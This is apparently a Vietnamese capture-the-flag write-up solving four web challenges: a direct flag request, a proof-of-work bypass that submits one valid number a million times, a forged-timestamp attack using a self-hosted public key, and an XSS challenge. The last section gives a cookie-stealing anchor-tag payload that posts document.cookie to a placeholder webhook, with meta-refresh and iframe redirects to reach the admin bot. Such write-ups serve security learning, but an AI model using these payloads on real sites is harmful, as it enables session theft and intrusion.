# Bad Worker
Sử dụng BurpSuite để ghi lại các request lên server, mình có request và response sau:

![image](https://hackmd.io/_uploads/SJC-ikDL0.png)

Request đến file flag là được.

![image](https://hackmd.io/_uploads/r17EiJPL0.png)

Flag: `FLAG{pr0gr3ssiv3_w3b_4pp_1s_us3fu1}`

# POW

Đây là đoạn script khi visit web page này

```javascript=

function hash(input) {
    let result = input;
    for (let i = 0; i < 10; i++) {
      result = CryptoJS.SHA256(result);
    }
    return (result.words[0] & 0xFFFFFF00) === 0;
}
async function send(array) {
document.getElementById("server-response").innerText = await fetch(
  "/api/pow",
  {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(array),
  }
).then((r) => r.text());
}
let i = BigInt(localStorage.getItem("pow_progress") || "0");
async function main() {
    await send([]);
    async function loop() {
      document.getElementById(
        "client-status"
      ).innerText = `Checking ${i.toString()}...`;
      localStorage.setItem("pow_progress", i.toString());
      for (let j = 0; j < 1000; j++) {
        i++;
        if (hash(i.toString())) {
          await send([i.toString()]);
        }
      }
      requestAnimationFrame(loop);
    }
    loop();
}
main();
    
```

Khi tìm được số hợp lệ thỏa mãn hàm `hash` kia, thì nó sẽ gửi 1 request lên server dưới dạng array. Khi đó progress sẽ tăng lên 1, khi đủ 1 triệu thì ta sẽ có được flag. 

![image](https://hackmd.io/_uploads/SJkPhkwL0.png)

Chú ý rằng ta gửi lên server 1 array các string là các số hợp lệ. Vậy sẽ ra sao nếu mình gửi request với array chứa nhiều số hợp lệ kia. 

![image](https://hackmd.io/_uploads/HJRgTyv8A.png)

Mình thành công khiến progress từ 4 lên 6. Vậy viết đoạn script genenerate ra 1 triệu số hợp lệ, đưa nó vào array và gửi lên server thôi. 

Dưới đây là script python hoặc sử dụng câu lệnh js kia đưa vào dev tool cũng được.

```python=
#!/usr/bin/python3
import requests

url = "https://web-pow-lz56g6.wanictf.org:443/api/pow"
header = {"Content-Type": "application/json"}
payload = ["2862152"]*1000000
response = requests.post(url, headers=header, json=payload)
cookie = response.cookies
response = requests.post(url, headers=header, cookies=cookie, json=payload)
print(response.content)
```

```javascript=
for(let i=0;i<10;i++)await send(new Array(100000).fill("2862152"));
```

# One day one letter
Challenge này thực sự rất là dễ nếu mình nhận ra vấn đề từ sớm. 

Ở đây, web có 2 server, 1 server là timeserver generate ra private key để sign cho timestamp nó tạo ra và 1 server chính sẽ lấy pubkey từ timeserver và để verify cái timestamp mà nó nhận được. 
Time Server
![image](https://hackmd.io/_uploads/Skvr01DUR.png)

Main server
![image](https://hackmd.io/_uploads/rkdDA1wUR.png)

Client sẽ request đến time server để nhận về chuỗi json gồm 3 key-value là timestamp, signature và timeserver. 
![image](https://hackmd.io/_uploads/Hk8jRkwIR.png)

Điểm mấu chốt ở đây là tác giả lại tách nó ra làm 2 server để làm gì, rồi client có thể điều chỉnh được param timeserver. Nghĩa là mình có thể kiểm soát được cái cặp private key và pubkey đến từ đâu. Hiểu được vấn đề mình ngay lập tức generate ra cặp key và host cái pubkey của mình để server chính request lên đó mà nhận cái pubkey.

Các bước thực hiện:

```python=
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS


key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


print(key)
print(pubkey)

flag = "FLAG{lyingthetime}"
flag = "FLAG{??????h?????}"

while (True):
    timestamp = str(int(input("Input your time stamp: "))).encode('utf-8')
    h = SHA256.new(timestamp)
    signer = DSS.new(key, 'fips-186-3')
    signature = signer.sign(h)
    print(signature.hex())
```

1. Chạy đoạn code trên để lấy pubkey được generate ra và đưa nó vào file tên pubkey
![image](https://hackmd.io/_uploads/HkN61gwUA.png)
2. Host pubkey của mình với pagekite với tên mình mình kiểm soát và có 1 đường dẫn là pubkey đến file pubkey vừa tạo
![image](https://hackmd.io/_uploads/S1SNxxP8R.png)
3. Giờ trở lại đoạn payload python vừa nãy, nhập timestamp tùy thích của mình, nó sẽ tự tạo ra signature với private key đã tạo ứng với pubkey mình host
![image](https://hackmd.io/_uploads/BJspgxwUR.png)
4. Giờ điều chỉnh timestamp sao cho nó khác từng ngày để leak từng kí tự của flag

Flag: `FLAG{lyingthetime}`

# No Script
Bài này khiến mình overthinking hơi nhiều do nó liên quan đến redis (database kiểu nosql dính khá nhiều vuln liên quan đến ssrf) và XSS được nhá hàng ở khá nhiều nơi trong web page và source code. 

Hơi confuse giữa vuln của redis hay XSS mặc dù tác giả ghi hẳn là 
`This page is protected by csp default-src 'self', script-src 'none'.

Can you xss me in this page to steal the user's cookie?`

Ở đây, chúng ta có chức năng update profile
![image](https://hackmd.io/_uploads/HJWZGxPIA.png)

cùng với report to admin
![image](https://hackmd.io/_uploads/HJlGGlv8C.png)

(Không hiểu sao vẫn confuse)
XSS ở endpoint /username
![image](https://hackmd.io/_uploads/BkrOMgvLC.png)

Web dùng hàm WriteString với val[0] đây là username mà mình update. Hàm WriteString kia khá là giống với cái hàm innerHTML, ghi các thẻ html lên webpage. Mình thấy nếu nó bị lỗi thì sẽ ghi ra thẻ a trong kia nên payload xss mình sẽ sử dụng thẻ a. (Mình có thử thẻ img nhưng mà nó in trực tiếp lên luôn chứ không thành 1 img như bình thường)

`<a autofocus='true' tabindex=1 id=x onfocus=fetch('https://WEBHOOK',{method:'POST',mode:'no-cors',body:document.cookie})>#x</a>`

Ở profile param cũng XSS được nhưng nó bị chặn bởi csp.
![image](https://hackmd.io/_uploads/BJgN3mgPIC.png)

Do report chỉ được gửi endpoint `/user` lên admin nhưng `/username` mới là nơi XSS để steal cookie. Vậy phải làm sao? 

Có cách đó chính là redirect admin từ `/user` sang `/username` với thẻ meta.
Sau này trên dis người ta cũng chia sẻ là có thể sử dụng thẻ iframe để trỏ tới `/username`.

`<meta http-equiv="refresh" content="0;url=/username/<id>">`

`<iframe src='/username/<id>'></iframe>`

Sau đó chỉ cần report cho admin với user-id của mình là được. 